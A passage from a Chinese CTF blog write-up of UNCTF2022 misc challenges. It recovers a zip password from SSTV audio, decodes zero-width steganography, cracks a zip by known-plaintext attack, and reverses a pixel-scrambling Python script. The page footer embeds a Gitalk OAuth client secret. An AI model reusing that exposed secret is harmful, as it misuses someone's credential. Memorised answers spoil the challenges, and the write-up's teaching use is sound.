<p>得到password，解密zip后得到另一个加密的zip和一个wav文件，听一遍后发现能用robot36识别：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202113397.png" alt=""></p>
<p>得到zip密码<code>V@mpir3</code>，解开后得到一端零宽隐写的文本，解密即可：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202031407.png" alt=""></p>
<h3 id="剥茧抽丝"><a href="#剥茧抽丝" class="headerlink" title="剥茧抽丝"></a>剥茧抽丝</h3><p>得到一个加密的zip和txt，txt中存在零宽隐写，先解出来，需要利用保存文件的方式解得，后缀名为txt：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202031337.png" alt=""></p>
<p>但这个解不开zip，结合提示，明文攻击，将txt去除零宽后压缩发现和zip中txt文件的CRC一样，可以明文攻击：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202033496.png" alt=""></p>
<p>明文攻击后得到flag.zip用零宽隐写解密得到的字符解密即可：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202033619.png" alt=""></p>
<h3 id="芝麻开门"><a href="#芝麻开门" class="headerlink" title="芝麻开门"></a>芝麻开门</h3><p>key.txt中发现：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202029718.png" alt=""></p>
<p>解码为<code>key1</code>，猜测为LSB隐写的密码，运行脚本解密即可：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202028284.png" alt=""></p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202028293.png" alt=""></p>
<h3 id="MY-PICTURE"><a href="#MY-PICTURE" class="headerlink" title="MY PICTURE"></a>MY PICTURE</h3><p>得到一个picture文件，放到kali里变成了压缩包，得到一个dat文件和一个png。</p>
<p>分析dat文件：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202028021.png" alt=""></p>
<p>异或<code>8E</code>后：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202027965.png" alt=""></p>
<p>得到一个压缩包，里面有个py文件：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image <span class="keyword">as</span> im</span><br><span class="line"></span><br><span class="line">flag = im.<span class="built_in">open</span>(<span class="string">&#x27;flag.jpg&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">l,h=flag.size</span><br><span class="line">puzzle=im.new(<span class="string">&#x27;RGB&#x27;</span>,(h,l))</span><br><span class="line"><span class="built_in">print</span>(puzzle)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">        r,g,b=flag.getpixel((i,j))</span><br><span class="line">        r=r^g</span><br><span class="line">        g=g^b</span><br><span class="line">        b=b^r</span><br><span class="line">        puzzle.putpixel(((i*<span class="number">787</span>+j)//<span class="number">1200</span>,(i*<span class="number">787</span>+j)%<span class="number">1200</span>),(b,g,r))</span><br><span class="line">puzzle.save(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line">flag.close()</span><br><span class="line">puzzle.close()</span><br></pre></td></tr></table></figure>
<p>说明对png进行了混淆，解混淆即可：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image <span class="keyword">as</span> im</span><br><span class="line">flag = im.<span class="built_in">open</span>(<span class="string">&quot;C:/Users/lenovo/Desktop/Picture/flag.png&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">l, h = flag.size</span><br><span class="line"><span class="built_in">print</span>(l, h)</span><br><span class="line">puzzle = im.new(<span class="string">&#x27;RGB&#x27;</span>, (h, l))</span><br><span class="line"><span class="built_in">print</span>(puzzle)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">        r, g, b = flag.getpixel(((i * <span class="number">787</span> + j) // <span class="number">1200</span>, (i * <span class="number">787</span> + j) % <span class="number">1200</span>))</span><br><span class="line">        r0 = r ^ g</span><br><span class="line">        g0 = r0 ^ g</span><br><span class="line">        b0 = r0 ^ b</span><br><span class="line">        puzzle.putpixel((i, j), (r0, g0, b0))</span><br><span class="line">puzzle.save(<span class="string">&#x27;zeroc.png&#x27;</span>)</span><br><span class="line">flag.close()</span><br><span class="line">puzzle.close()</span><br></pre></td></tr></table></figure>
<p>最后得到：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202123976.png" alt=""></p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Write-up/" rel="tag"># Write-up</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/uncategorized/Begin/" rel="prev" title="Begin">
      <i class="fa fa-chevron-left"></i> Begin
    </a></div>
      <div class="post-nav-item">
    <a href="/CTF-WP/RCTF2022/" rel="next" title="RCTF2022">
      RCTF2022 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="gitalk-container"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#UNCTF2022-WP-By-Zeroc"><span class="nav-number">1.</span> <span class="nav-text">UNCTF2022  WP  By  Zeroc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">1.1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ezgame"><span class="nav-number">1.1.1.</span> <span class="nav-text">ezgame</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%88%91%E5%A4%AA%E5%96%9C%E6%AC%A2bilibili%E5%A4%A7%E5%AD%A6%E5%95%A6"><span class="nav-number">1.1.2.</span> <span class="nav-text">我太喜欢bilibili大学啦</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#babyphp"><span class="nav-number">1.1.3.</span> <span class="nav-text">babyphp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-upload"><span class="nav-number">1.1.4.</span> <span class="nav-text">easy_upload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%88%91%E5%A4%AA%E5%96%9C%E6%AC%A2bilibili%E5%A4%A7%E5%AD%A6%E5%95%A6%E4%BF%AE%E5%A4%8D%E7%89%88"><span class="nav-number">1.1.5.</span> <span class="nav-text">我太喜欢bilibili大学啦修复版</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#302"><span class="nav-number">1.1.6.</span> <span class="nav-text">302</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%99%E4%BD%A0%E4%B8%80%E5%88%80"><span class="nav-number">1.1.7.</span> <span class="nav-text">给你一刀</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%AC%E8%AF%B4PHP%E6%9C%89%E4%B8%AAXXE"><span class="nav-number">1.1.8.</span> <span class="nav-text">听说PHP有个XXE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-ssti"><span class="nav-number">1.1.9.</span> <span class="nav-text">easy ssti</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ezunseri"><span class="nav-number">1.1.10.</span> <span class="nav-text">ezunseri</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#poppop"><span class="nav-number">1.1.11.</span> <span class="nav-text">poppop</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#babynode"><span class="nav-number">1.1.12.</span> <span class="nav-text">babynode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="nav-number">1.1.13.</span> <span class="nav-text">随便注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-rce"><span class="nav-number">1.1.14.</span> <span class="nav-text">easy_rce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%96%E7%95%8C%E5%92%8C%E5%B9%B3"><span class="nav-number">1.1.15.</span> <span class="nav-text">世界和平</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sqlsql"><span class="nav-number">1.1.16.</span> <span class="nav-text">Sqlsql</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BF%AB%E4%B9%90%E4%B8%89%E6%B6%88"><span class="nav-number">1.1.17.</span> <span class="nav-text">快乐三消</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN"><span class="nav-number">1.2.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#WelcomeUNCTF2022"><span class="nav-number">1.2.1.</span> <span class="nav-text">WelcomeUNCTF2022</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%B3%E5%A4%B4%E5%89%AA%E5%88%80%E5%B8%83"><span class="nav-number">1.2.2.</span> <span class="nav-text">石头剪刀布</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RE"><span class="nav-number">1.3.</span> <span class="nav-text">RE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#whereisyourkey"><span class="nav-number">1.3.1.</span> <span class="nav-text">whereisyourkey</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-number">1.4.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#md5-1"><span class="nav-number">1.4.1.</span> <span class="nav-text">md5-1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dddd"><span class="nav-number">1.4.2.</span> <span class="nav-text">dddd</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#caeser"><span class="nav-number">1.4.3.</span> <span class="nav-text">caeser</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Single-table"><span class="nav-number">1.4.4.</span> <span class="nav-text">Single table</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#md5-2"><span class="nav-number">1.4.5.</span> <span class="nav-text">md5-2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#babyRSA"><span class="nav-number">1.4.6.</span> <span class="nav-text">babyRSA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ezRSA"><span class="nav-number">1.4.7.</span> <span class="nav-text">ezRSA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8A%E6%99%9A%E5%90%83%E4%BB%80%E4%B9%88"><span class="nav-number">1.4.8.</span> <span class="nav-text">今晚吃什么</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-RSA"><span class="nav-number">1.4.9.</span> <span class="nav-text">easy_RSA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Multi-table"><span class="nav-number">1.4.10.</span> <span class="nav-text">Multi table</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ezxor"><span class="nav-number">1.4.11.</span> <span class="nav-text">ezxor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Fermat"><span class="nav-number">1.4.12.</span> <span class="nav-text">Fermat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Today-is-Thursday-V-me-50"><span class="nav-number">1.4.13.</span> <span class="nav-text">Today_is_Thursday_V_me_50</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EZcry"><span class="nav-number">1.4.14.</span> <span class="nav-text">EZcry</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-lfsr"><span class="nav-number">1.4.15.</span> <span class="nav-text">easy_lfsr</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-number">1.5.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#magic-word"><span class="nav-number">1.5.1.</span> <span class="nav-text">magic_word</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BE%E4%BB%80%E4%B9%88%E7%A4%BE"><span class="nav-number">1.5.2.</span> <span class="nav-text">社什么社</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%BE%E5%BE%97%E5%88%B0%E6%88%91%E5%90%97"><span class="nav-number">1.5.3.</span> <span class="nav-text">找得到我吗</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#syslog"><span class="nav-number">1.5.4.</span> <span class="nav-text">syslog</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A8%E9%B1%BC"><span class="nav-number">1.5.5.</span> <span class="nav-text">巨鱼</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#In-the-Morse-Garden"><span class="nav-number">1.5.6.</span> <span class="nav-text">In_the_Morse_Garden</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#zhiyin"><span class="nav-number">1.5.7.</span> <span class="nav-text">zhiyin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B8%85%E5%92%8Cfan"><span class="nav-number">1.5.8.</span> <span class="nav-text">清和fan</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%A5%E8%8C%A7%E6%8A%BD%E4%B8%9D"><span class="nav-number">1.5.9.</span> <span class="nav-text">剥茧抽丝</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8A%9D%E9%BA%BB%E5%BC%80%E9%97%A8"><span class="nav-number">1.5.10.</span> <span class="nav-text">芝麻开门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MY-PICTURE"><span class="nav-number">1.5.11.</span> <span class="nav-text">MY PICTURE</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Zeroc"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">Zeroc</p>
  <div class="site-description" itemprop="description">莫忘少年凌云志，曾许天下第一流</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">3</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Zeroc0077" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Zeroc0077" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="/1357494951@qq.com" title="E-Mail → 1357494951@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Zeroc</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">Symbols count total: </span>
    <span title="Symbols count total">67k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">Reading time total &asymp;</span>
    <span title="Reading time total">1:01</span>
</div>

<div class="powered-by">
  <i class="fa fa-user-md"></i>
  <span id="busuanzi_container_site_uv">
    本站总访客数:<span id="busuanzi_value_site_uv"></span>&nbsp;&nbsp;| 
  </span>
  <span id="busuanzi_container_site_pv">
      &nbsp;本站总访问量<span id="busuanzi_value_site_pv"></span>次
  </span>
  </div>
</div>

<script>
      var now = new Date(); 
      function createtime() { 
          var grt= new Date("20/11/2022 12:00:00");//此处修改你的建站时间或者网站上线时间 
          now.setTime(now.getTime()+250); 
          days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
          hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
          if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
          mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
          seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
          snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
          document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "; 
          document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
      } 
  setInterval("createtime()",250);
</script>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script color='' opacity='' zIndex='' count='' src="/lib/canvas-nest/canvas-nest-nomobile.min.js"></script>
  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

  

  <script async src="/js/cursor/click.js"></script>

<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">

<script>
NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
    var gitalk = new Gitalk({
      clientID    : '581477a9710f647e6f45',
      clientSecret: '1ed64b87e2add97d8eea831ad7273fbc8988dae3',
      repo        : 'Zeroc0077.github.io',
      owner       : 'Zeroc0077',
      admin       : ['Zeroc0077'],
      id          : '632de7e25c4e879cbc9ff5ba3c164cec',
        language: '',
      distractionFreeMode: true
    });
    gitalk.render('gitalk-container');
  }, window.Gitalk);
});
</script>

</body>
</html>
